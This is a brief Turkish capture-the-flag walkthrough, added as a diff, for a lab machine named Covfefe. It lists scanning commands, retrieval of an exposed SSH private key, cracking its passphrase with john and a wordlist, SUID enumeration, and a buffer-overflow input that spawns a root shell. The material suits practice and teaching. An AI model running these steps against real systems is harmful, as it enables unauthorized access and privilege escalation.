@@ -1,0 +1,13 @@
+COVFEFE MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.58 bulundu.
+2 - nmap -A 192.168.2.58
+3 - gobuster dir -u http://192.168.2.58:31337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - http://192.168.2.58:31337/taxes/ -> FLAG 1
+5 - http://192.168.2.58:31337/.ssh/id_rsa, http://192.168.2.58:31337/.ssh/id_rsa.pub, http://192.168.2.58:31337/.ssh/authorized_keys
+6 - ssh2john id_rsa > hash
+7 - john hash -w=/usr/share/wordlists/rockyou.txt -> starwars
+8 - ssh -i id_rsa simon@192.168.2.58
+9 - find / -perm -u=s -type f 2>/dev/null
+10 - cd /root, cat read_message.c -> FLAG 3
+11 - char buf[20] =>> SimonAAAAAAAAAAAAAA/bin/sh
+12 - whoami
